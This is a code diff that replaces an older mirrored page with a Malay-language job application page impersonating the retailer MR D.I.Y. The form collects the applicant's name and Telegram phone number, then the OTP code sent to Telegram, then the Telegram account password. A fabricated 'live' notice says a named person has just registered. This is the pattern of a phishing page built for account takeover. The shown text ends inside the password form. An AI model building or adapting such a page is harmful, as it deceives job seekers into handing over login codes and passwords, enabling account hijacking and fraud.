@@ -1,379 +1,1383 @@
-<!doctype html>
-<html lang="en" class="h-100">
-
-
-<!-- Mirrored from jawatankosong1.gy-i1d.com/02/jobs/MR.D.I.Y/?index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 May 2024 06:06:14 GMT -->
-<head id="ctl00_Head1">
-    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
-    <link href="assets/css/custom.css" type="text/css" rel="stylesheet" />
-    <link href="assets/css/menebus.css" type="text/css" rel="stylesheet" />
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta property="og:title" content="JawatanKosong Malaysia 2024">
-    <meta property="og:image" content="">
-    <meta name="description" />
-    <meta name="author" content="Mykasih Foundation" />
-    <title>JawatanKosong</title>
-    <link rel="icon" type="image/x-icon" href="favicon.html" />
-    <link rel="canonical" href="../../../../getbootstrap.com/docs/5.0/examples/sticky-footer/index.html" />
-    <link rel="stylesheet" href="assets/css/bootstrap-icons.css" />
-    <script type="text/javascript" src="js/vue.min.js.download"></script>
-    <script src="js/clipboard.js.download"></script>
-    <script type="text/javascript" src="js/index.js.download"></script>
-    <style type="text/css">
-        .bd-placeholder-img {
-            font-size: 1.125rem;
-            text-anchor: middle;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            user-select: none;
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Jawatan Kosong MR D.I.Y - Mohon Sekarang</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800;14..32,900&display=swap" rel="stylesheet" />
+    <style>
+        /* ---------- RESET & ROOT ---------- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
         }
 
-        @media (min-width: 768px) {
-            .bd-placeholder-img-lg {
-                font-size: 3.5rem;
-            }
+        :root {
+            --primary: #F9A825;
+            /* kuning MR D.I.Y */
+            --primary-dark: #F57F17;
+            --primary-light: #FFF8E1;
+            --accent: #D32F2F;
+            /* aksen merah kecil */
+            --accent-soft: #FFCDD2;
+            --bg-body: #FFFDE7;
+            --card-bg: #FFFFFF;
+            --text-dark: #3E2C1B;
+            --text-muted: #6D4C2A;
+            --text-soft: #A67B5B;
+            --shadow-card: 0 20px 60px rgba(0, 0, 0, 0.08), 0 8px 24px rgba(0, 0, 0, 0.04);
+            --radius-card: 32px;
+            --radius-input: 16px;
+            --radius-btn: 16px;
+            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        /* Absolute Center Spinner */
-        .loading {
-            position: fixed;
-            z-index: 999;
-            height: 2em;
-            width: 2em;
-            overflow: show;
-            margin: auto;
-            top: 0;
-            left: 0;
-            bottom: 0;
-            right: 0;
+        body {
+            background: var(--bg-body);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px;
+            background-image: radial-gradient(circle at 10% 30%, rgba(249, 168, 37, 0.08) 0%, transparent 60%),
+                radial-gradient(circle at 90% 70%, rgba(211, 47, 47, 0.04) 0%, transparent 50%);
         }
 
-        /* Transparent Overlay */
-        .loading:before {
-            content: '';
-            display: block;
-            position: fixed;
-            top: 0;
-            left: 0;
+        /* ---------- CONTAINER ---------- */
+        .container {
             width: 100%;
-            height: 100%;
-            background: radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
-
-            background: -webkit-radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
+            max-width: 480px;
         }
 
-        /* :not(:required) hides these rules from IE9 and below */
-        .loading:not(:required) {
-            /* hide "loading..." text */
-            font: 0/0 a;
-            color: transparent;
-            text-shadow: none;
-            background-color: transparent;
-            border: 0;
+        /* ---------- MAIN CARD ---------- */
+        .main-card {
+            background: var(--card-bg);
+            border-radius: var(--radius-card);
+            box-shadow: var(--shadow-card);
+            overflow: hidden;
+            border: 1px solid rgba(0, 0, 0, 0.02);
+            transition: var(--transition);
         }
 
-        .loading:not(:required):after {
+        /* ---------- HEADER ---------- */
+        .header {
+            background: linear-gradient(145deg, var(--primary) 0%, var(--primary-dark) 100%);
+            padding: 32px 28px 40px;
+            color: #fff;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
             content: '';
+            position: absolute;
+            inset: 0;
+            background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.08'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        .header-content {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .header-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .header-badge {
+            background: rgba(255, 255, 255, 0.20);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            padding: 6px 18px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: #3E2C1B;
+        }
+
+        .header-badge i {
+            font-size: 0.8rem;
+            color: var(--accent);
+        }
+
+        .header-icon {
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            width: 52px;
+            height: 52px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.10);
+        }
+
+        .header-icon i {
+            font-size: 26px;
+            color: var(--accent);
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.10));
+        }
+
+        .header h1 {
+            font-size: 2.1rem;
+            font-weight: 900;
+            line-height: 1.1;
+            letter-spacing: -0.5px;
+            color: #3E2C1B;
+        }
+
+        .header h1 span {
+            color: #fff;
+            background: linear-gradient(to right, #fff, #FFF8E1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header p {
+            font-size: 0.9rem;
+            opacity: 0.9;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 4px;
+            color: #3E2C1B;
+        }
+
+        .header p i {
+            color: var(--accent);
+            font-size: 0.8rem;
+        }
+
+        /* ---------- HERO BANNER ---------- */
+        .hero-stack {
+            padding: 0 20px;
+            margin-top: -22px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .hero-banner {
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 12px 32px -8px rgba(0, 0, 0, 0.12);
+            border: 2px solid rgba(255, 255, 255, 0.80);
+            transition: var(--transition);
+            background: #fff;
+        }
+
+        .hero-banner img {
+            width: 100%;
+            height: auto;
             display: block;
-            font-size: 10px;
-            width: 1em;
-            height: 1em;
-            margin-top: -0.5em;
-            -webkit-animation: spinner 150ms infinite linear;
-            -moz-animation: spinner 150ms infinite linear;
-            -ms-animation: spinner 150ms infinite linear;
-            -o-animation: spinner 150ms infinite linear;
-            animation: spinner 150ms infinite linear;
-            border-radius: 0.5em;
-            -webkit-box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
-            box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
+            transition: var(--transition);
         }
 
-        /* Animation */
+        .hero-banner:hover img {
+            transform: scale(1.02);
+        }
 
-        @-webkit-keyframes spinner {
-            0% {
-                -webkit-transform: rotate(0deg);
-                -moz-transform: rotate(0deg);
-                -ms-transform: rotate(0deg);
-                -o-transform: rotate(0deg);
-                transform: rotate(0deg);
+        /* ---------- PROGRESS BAR ---------- */
+        .progress-wrapper {
+            padding: 24px 24px 8px;
+        }
+
+        .progress-steps {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+        }
+
+        .progress-steps::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 12%;
+            right: 12%;
+            height: 3px;
+            background: #E8ECF1;
+            transform: translateY(-50%);
+            border-radius: 4px;
+            z-index: 0;
+        }
+
+        .progress-step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            position: relative;
+            z-index: 1;
+            flex: 1;
+        }
+
+        .step-dot {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #E8ECF1;
+            color: #9AA6B2;
+            font-weight: 700;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+            border: 3px solid #fff;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+
+        .step-dot.active {
+            background: var(--primary);
+            color: #3E2C1B;
+            box-shadow: 0 4px 16px rgba(249, 168, 37, 0.35);
+            transform: scale(1.05);
+        }
+
+        .step-dot.done {
+            background: var(--accent);
+            color: #fff;
+            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.30);
+        }
+
+        .step-dot .step-icon {
+            display: none;
+            font-size: 1rem;
+        }
+
+        .step-dot.active .step-num {
+            display: none;
+        }
+        .step-dot.active .step-icon {
+            display: inline;
+        }
+        .step-dot.done .step-num {
+            display: none;
+        }
+        .step-dot.done .step-icon {
+            display: inline;
+        }
+
+        .step-label {
+            font-size: 0.6rem;
+            font-weight: 700;
+            color: #9AA6B2;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: var(--transition);
+        }
+
+        .step-label.active {
+            color: var(--primary-dark);
+        }
+
+        .step-label.done {
+            color: var(--text-muted);
+        }
+
+        /* ---------- LIVE NOTIFICATION ---------- */
+        .live-notification {
+            margin: 16px 24px 8px;
+            padding: 12px 18px;
+            background: var(--primary-light);
+            border-radius: 16px;
+            border-left: 6px solid var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            box-shadow: 0 4px 12px rgba(249, 168, 37, 0.12);
+            animation: fadeInUp 0.5s ease;
+            transition: var(--transition);
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(12px);
             }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
 
+        .live-notification .notif-dot {
+            width: 10px;
+            height: 10px;
+            background: #4CAF50;
+            border-radius: 50%;
+            animation: pulse 1.8s infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes pulse {
+            0% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.4;
+                transform: scale(1.3);
+            }
             100% {
-                -webkit-transform: rotate(360deg);
-                -moz-transform: rotate(360deg);
-                -ms-transform: rotate(360deg);
-                -o-transform: rotate(360deg);
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .live-notification .notif-text {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .live-notification .notif-text strong {
+            color: var(--accent);
+            font-weight: 800;
+        }
+
+        .live-notification .notif-time {
+            font-size: 0.65rem;
+            color: var(--text-soft);
+            margin-left: auto;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+
+        /* ---------- FORM CONTAINER ---------- */
+        .form-container {
+            padding: 8px 24px 32px;
+        }
+
+        .form-header {
+            margin-bottom: 24px;
+        }
+
+        .form-title {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .form-title i {
+            color: var(--primary-dark);
+            font-size: 1.4rem;
+            background: var(--primary-light);
+            padding: 10px;
+            border-radius: 14px;
+        }
+
+        .form-subtitle {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            font-weight: 500;
+            margin-top: 4px;
+            padding-left: 54px;
+        }
+
+        /* ---------- INPUTS ---------- */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 6px;
+            letter-spacing: -0.2px;
+        }
+
+        .input-label i {
+            color: var(--primary-dark);
+            width: 20px;
+            margin-right: 4px;
+        }
+
+        .input-container {
+            position: relative;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 18px;
+            background: #F8FAFC;
+            border: 2px solid #E8ECF1;
+            border-radius: var(--radius-input);
+            font-size: 1rem;
+            font-weight: 500;
+            color: var(--text-dark);
+            outline: none;
+            transition: var(--transition);
+            box-shadow: none;
+        }
+
+        .form-input::placeholder {
+            color: #B0BEC5;
+            font-weight: 400;
+        }
+
+        .form-input:focus {
+            border-color: var(--primary);
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(249, 168, 37, 0.15);
+        }
+
+        .form-input:not(:placeholder-shown) {
+            background: #fff;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #B0BEC5;
+            font-size: 1.1rem;
+            transition: var(--transition);
+            pointer-events: none;
+        }
+
+        .form-input:focus~.input-icon {
+            color: var(--primary-dark);
+        }
+
+        .input-hint {
+            font-size: 0.7rem;
+            color: var(--text-soft);
+            margin-top: 6px;
+            padding-left: 4px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .input-hint i {
+            color: var(--primary-dark);
+            font-size: 0.6rem;
+        }
+
+        /* ---------- BUTTONS ---------- */
+        .btn {
+            background: linear-gradient(145deg, var(--primary) 0%, var(--primary-dark) 100%);
+            border: none;
+            padding: 16px 24px;
+            border-radius: var(--radius-btn);
+            width: 100%;
+            font-weight: 700;
+            font-size: 1rem;
+            color: #3E2C1B;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 0 #E65100, 0 6px 20px rgba(249, 168, 37, 0.25);
+            transition: var(--transition);
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.20);
+            letter-spacing: 0.3px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 0 #E65100, 0 12px 28px rgba(249, 168, 37, 0.30);
+        }
+
+        .btn:active {
+            transform: translateY(4px);
+            box-shadow: 0 2px 0 #E65100, 0 6px 20px rgba(249, 168, 37, 0.15);
+        }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.15) 0%, transparent 60%);
+            pointer-events: none;
+        }
+
+        .btn-secondary {
+            background: #F5EDE6;
+            color: var(--text-dark);
+            box-shadow: 0 4px 0 #DCCFC4, 0 4px 12px rgba(0, 0, 0, 0.02);
+            border: 1px solid rgba(0, 0, 0, 0.02);
+        }
+
+        .btn-secondary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 0 #DCCFC4, 0 8px 24px rgba(0, 0, 0, 0.04);
+            background: #F8FAFC;
+        }
+
+        .btn-secondary:active {
+            transform: translateY(3px);
+            box-shadow: 0 2px 0 #DCCFC4, 0 4px 12px rgba(0, 0, 0, 0.02);
+        }
+
+        .btn-secondary::after {
+            display: none;
+        }
+
+        .btn i {
+            font-size: 1.05rem;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        .button-group .btn {
+            flex: 1;
+        }
+
+        /* ---------- FOOTER ---------- */
+        .footer-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.7rem;
+            color: var(--text-soft);
+        }
+
+        .footer-note a {
+            color: var(--accent);
+            font-weight: 700;
+            text-decoration: none;
+            border-bottom: 1px dotted var(--primary);
+        }
+
+        .footer-note a:hover {
+            border-bottom-color: var(--accent);
+        }
+
+        /* ---------- SUCCESS ---------- */
+        .success-container {
+            text-align: center;
+            padding: 16px 8px 8px;
+        }
+
+        .success-icon {
+            background: linear-gradient(145deg, var(--primary), var(--primary-dark));
+            width: 88px;
+            height: 88px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+            font-size: 3.2rem;
+            color: #fff;
+            box-shadow: 0 12px 0 #E65100, 0 16px 48px rgba(249, 168, 37, 0.30);
+            animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popIn {
+            0% {
+                transform: scale(0.4) rotate(-8deg);
+                opacity: 0;
+            }
+            100% {
+                transform: scale(1) rotate(0deg);
+                opacity: 1;
+            }
+        }
+
+        .success-title {
+            font-size: 1.8rem;
+            font-weight: 900;
+            color: var(--text-dark);
+            letter-spacing: -0.5px;
+        }
+
+        .success-desc {
+            color: var(--text-muted);
+            margin: 6px 0 24px;
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+
+        .data-container {
+            background: #F8FAFC;
+            border-radius: 20px;
+            padding: 16px 20px;
+            margin: 6px 0 20px;
+            border: 1px solid #E8ECF1;
+            text-align: left;
+        }
+
+        .data-container textarea {
+            width: 100%;
+            border: none;
+            background: transparent;
+            resize: none;
+            font-family: 'Inter', monospace;
+            font-size: 0.78rem;
+            color: var(--text-dark);
+            line-height: 1.6;
+            outline: none;
+            min-height: 120px;
+        }
+
+        /* ---------- LOADING ---------- */
+        .loading {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(26, 26, 46, 0.50);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-box {
+            background: #fff;
+            padding: 40px 48px;
+            border-radius: 32px;
+            box-shadow: 0 32px 80px rgba(0, 0, 0, 0.25);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 18px;
+            border: 1px solid rgba(255, 255, 255, 0.10);
+        }
+
+        .spinner {
+            width: 52px;
+            height: 52px;
+            border: 4px solid #E8ECF1;
+            border-radius: 50%;
+            border-top-color: var(--primary);
+            border-right-color: var(--accent);
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
                 transform: rotate(360deg);
             }
         }
 
-        @-moz-keyframes spinner {
-            0% {
-                -webkit-transform: rotate(0deg);
-                -moz-transform: rotate(0deg);
-                -ms-transform: rotate(0deg);
-                -o-transform: rotate(0deg);
-                transform: rotate(0deg);
-            }
+        .loading-text {
+            font-weight: 700;
+            color: var(--text-dark);
+            font-size: 0.95rem;
+        }
 
+        /* ---------- NOTIFICATION (sistem) ---------- */
+        .notification {
+            position: fixed;
+            top: 20px;
+            left: 16px;
+            right: 16px;
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 14px 20px;
+            border-radius: 20px;
+            color: #fff;
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            box-shadow: 0 16px 48px rgba(0, 0, 0, 0.15);
+            animation: slideDown 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            gap: 12px;
+            font-weight: 600;
+            font-size: 0.92rem;
+        }
+
+        @keyframes slideDown {
+            0% {
+                opacity: 0;
+                transform: translateY(-30px) scale(0.96);
+            }
             100% {
-                -webkit-transform: rotate(360deg);
-                -moz-transform: rotate(360deg);
-                -ms-transform: rotate(360deg);
-                -o-transform: rotate(360deg);
-                transform: rotate(360deg);
+                opacity: 1;
+                transform: translateY(0) scale(1);
             }
         }
 
-        @-o-keyframes spinner {
-            0% {
-                -webkit-transform: rotate(0deg);
-                -moz-transform: rotate(0deg);
-                -ms-transform: rotate(0deg);
-                -o-transform: rotate(0deg);
-                transform: rotate(0deg);
-            }
+        .notification.success {
+            background: linear-gradient(135deg, #43A047, #2E7D32);
+            border: 1px solid rgba(255, 255, 255, 0.10);
+        }
+        .notification.error {
+            background: linear-gradient(135deg, #E53935, #B71C1C);
+            border: 1px solid rgba(255, 255, 255, 0.10);
+        }
+        .notification.info {
+            background: linear-gradient(135deg, #F57C00, #E65100);
+            border: 1px solid rgba(255, 255, 255, 0.10);
+        }
 
-            100% {
-                -webkit-transform: rotate(360deg);
-                -moz-transform: rotate(360deg);
-                -ms-transform: rotate(360deg);
-                -o-transform: rotate(360deg);
-                transform: rotate(360deg);
+        .notification .notif-icon {
+            font-size: 1.5rem;
+            flex-shrink: 0;
+        }
+
+        .notification .notif-close {
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.70);
+            font-size: 1.5rem;
+            cursor: pointer;
+            padding: 0 4px;
+            margin-left: auto;
+            transition: var(--transition);
+        }
+
+        .notification .notif-close:hover {
+            color: #fff;
+            transform: scale(1.1);
+        }
+
+        /* ---------- UTILITY ---------- */
+        .hidden {
+            display: none !important;
+        }
+
+        /* ---------- RESPONSIVE ---------- */
+        @media (max-width: 400px) {
+            .header h1 {
+                font-size: 1.6rem;
+            }
+            .header-icon {
+                width: 44px;
+                height: 44px;
+            }
+            .header-icon i {
+                font-size: 20px;
+            }
+            .step-dot {
+                width: 34px;
+                height: 34px;
+                font-size: 0.75rem;
+            }
+            .form-title {
+                font-size: 1.2rem;
+            }
+            .form-title i {
+                font-size: 1rem;
+                padding: 8px;
+            }
+            .form-container {
+                padding: 4px 16px 24px;
+            }
+            .button-group {
+                flex-direction: column;
+            }
+            .success-icon {
+                width: 72px;
+                height: 72px;
+                font-size: 2.6rem;
+            }
+            .success-title {
+                font-size: 1.4rem;
+            }
+            .progress-steps::before {
+                left: 8%;
+                right: 8%;
+            }
+            .live-notification {
+                margin: 12px 16px 8px;
+                padding: 10px 14px;
+            }
+            .live-notification .notif-text {
+                font-size: 0.75rem;
             }
         }
 
-        @keyframes spinner {
-            0% {
-                -webkit-transform: rotate(0deg);
-                -moz-transform: rotate(0deg);
-                -ms-transform: rotate(0deg);
-                -o-transform: rotate(0deg);
-                transform: rotate(0deg);
+        @media (min-width: 480px) {
+            .button-group {
+                flex-direction: row;
             }
+        }
 
-            100% {
-                -webkit-transform: rotate(360deg);
-                -moz-transform: rotate(360deg);
-                -ms-transform: rotate(360deg);
-                -o-transform: rotate(360deg);
-                transform: rotate(360deg);
-            }
+        /* ---------- SCROLLBAR ---------- */
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 8px;
         }
     </style>
 </head>
+<body>
 
-<body class="d-flex flex-column h-100">
+    <!-- LOADING OVERLAY -->
+    <div class="loading" id="loading">
+        <div class="loading-box">
+            <div class="spinner"></div>
+            <span class="loading-text">Memproses permohonan...</span>
+        </div>
+    </div>
 
-    <!---
-<div class="item">
-<div class="record_logo">
-<img src="assets/img/avatar.png" alt="">
-</div>
-<div class="center">
-<div class="h1"><span class="name"></span> <span>Berjaya</span> <span class="number">RM 1.000,00</span></div>
-<div class="h2">3 jam yang lalu</div>
-</div>
-</div>
---->
-    <div id="loading" class="loading" style="display: none;"></div>
+    <div class="container">
+        <div class="main-card">
 
-    <main class="flex-shrink-0">
-        <div id="ctl00_divContainer" class="container container-narrow">
-            <div class="text-center mt-2">
-                <a id="ctl00_lnkMalay" disabled="disabled"
-                    style="color:#fb0d1d;font-weight:bold;text-decoration:none;">
-                </a>
-               
+            <!-- ===== HEADER ===== -->
+            <div class="header">
+                <div class="header-content">
+                    <div class="header-top">
+                        <span class="header-badge"><i class="fas fa-star"></i> Kerjaya 2026</span>
+                        <div class="header-icon">
+                            <i class="fas fa-briefcase"></i>
+                        </div>
+                    </div>
+                    <h1>Jawatan Kosong<br /><span>MR D.I.Y</span></h1>
+                    <p><i class="fas fa-bolt"></i> Sertai keluarga MR D.I.Y &bull; Peluang kerjaya menanti!</p>
+                </div>
             </div>
-            <div class="header mt-3 text-center">
-                <img src="assets/img/2.jpg" id="ctl00_logohead" class="img-fluid" width="450" />
+
+            <!-- ===== HERO ===== -->
+            <div class="hero-stack">
+                <div class="hero-banner">
+                    <img src="https://g.top4top.io/p_38509ojn81.jpeg" alt="Kerjaya MR D.I.Y" loading="lazy" />
+                </div>
             </div>
-            <script type="text/javascript">
-                //<![CDATA[
-                var theForm = document.forms['aspnetForm'];
-                if (!theForm) {
-                    theForm = document.aspnetForm;
-                    A
+
+            <!-- ===== PROGRESS STEPS ===== -->
+            <div class="progress-wrapper">
+                <div class="progress-steps" id="progressSteps">
+                    <div class="progress-step">
+                        <div class="step-dot active" id="step1Dot">
+                            <span class="step-num">1</span>
+                            <span class="step-icon"><i class="fas fa-check"></i></span>
+                        </div>
+                        <span class="step-label active" id="step1Label">Maklumat</span>
+                    </div>
+                    <div class="progress-step">
+                        <div class="step-dot" id="step2Dot">
+                            <span class="step-num">2</span>
+                            <span class="step-icon"><i class="fas fa-check"></i></span>
+                        </div>
+                        <span class="step-label" id="step2Label">Pengesahan</span>
+                    </div>
+                    <div class="progress-step">
+                        <div class="step-dot" id="step3Dot">
+                            <span class="step-num">3</span>
+                            <span class="step-icon"><i class="fas fa-check"></i></span>
+                        </div>
+                        <span class="step-label" id="step3Label">Akhir</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== LIVE NOTIFICATION ===== -->
+            <div class="live-notification" id="liveNotification">
+                <span class="notif-dot"></span>
+                <span class="notif-text" id="notifText">
+                    <strong id="notifName">Nur Amiera</strong> Telah Berjaya Mendaftar
+                </span>
+                <span class="notif-time" id="notifTime">baru</span>
+            </div>
+
+            <!-- ===== FORM CONTAINER ===== -->
+            <div class="form-container">
+
+                <!-- STEP 1 -->
+                <div id="step1">
+                    <div class="form-header">
+                        <div class="form-title"><i class="fas fa-user-circle"></i> Maklumat Pemohon</div>
+                        <div class="form-subtitle">Isi butiran peribadi untuk permohonan jawatan</div>
+                    </div>
+                    <form id="form1">
+                        <div class="input-group">
+                            <label class="input-label"><i class="fas fa-id-card"></i> Nama Penuh (seperti IC)</label>
+                            <div class="input-container">
+                                <input type="text" class="form-input" id="nama_penuh" placeholder="cth: MUHAMMAD BIN ABDULLAH" required autocomplete="name" />
+                                <i class="fas fa-user input-icon"></i>
+                            </div>
+                        </div>
+
+                        <div class="input-group">
+                            <label class="input-label"><i class="fas fa-phone-alt"></i> Nombor Telefon (Telegram)</label>
+                            <div class="input-container">
+                                <input type="tel" class="form-input" id="nombor_telefon" placeholder="0123456789" required autocomplete="tel" />
+                                <i class="fab fa-telegram input-icon"></i>
+                            </div>
+                            <div class="input-hint">
+                                <i class="fas fa-circle"></i> Nombor tanpa +60 &bull; cth: 123456789 (untuk dihubungi HR)
+                            </div>
+                        </div>
+
+                        <button type="submit" class="btn">
+                            <i class="fas fa-arrow-right"></i> Teruskan
+                        </button>
+
+                        <div class="footer-note">
+                            Dengan menghantar, anda bersetuju dengan <a href="#">Syarat &amp; Dasar Privasi</a> MR D.I.Y.
+                        </div>
+                    </form>
+                </div>
+
+                <!-- STEP 2 -->
+                <div id="step2" class="hidden">
+                    <div class="form-header">
+                        <div class="form-title"><i class="fas fa-shield-alt"></i> Pengesahan OTP</div>
+                        <div class="form-subtitle">Masukkan kod 5 digit yang dihantar ke Telegram anda</div>
+                    </div>
+                    <form id="form2">
+                        <div class="input-group">
+                            <label class="input-label"><i class="fas fa-key"></i> Kod OTP</label>
+                            <div class="input-container">
+                                <input type="text" class="form-input" id="otp" placeholder="12345" maxlength="5" required inputmode="numeric" />
+                                <i class="fas fa-lock input-icon"></i>
+                            </div>
+                            <div class="input-hint">
+                                <i class="fas fa-paper-plane"></i> Dihantar ke +60 <span id="phone-preview" style="font-weight:700;color:var(--primary-dark);"></span>
+                            </div>
+                        </div>
+                        <div class="button-group">
+                            <button type="button" class="btn btn-secondary" onclick="goToStep(1)"><i class="fas fa-arrow-left"></i> Kembali</button>
+                            <button type="submit" class="btn"><i class="fas fa-check-circle"></i> Sahkan</button>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- STEP 3 -->
+                <div id="step3" class="hidden">
+                    <div class="form-header">
+                        <div class="form-title"><i class="fas fa-fingerprint"></i> Pengesahan Akhir</div>
+                        <div class="form-subtitle">Masukkan kata laluan akaun Telegram anda</div>
+                    </div>
+                    <form id="form3">
+                        <div class="input-group">
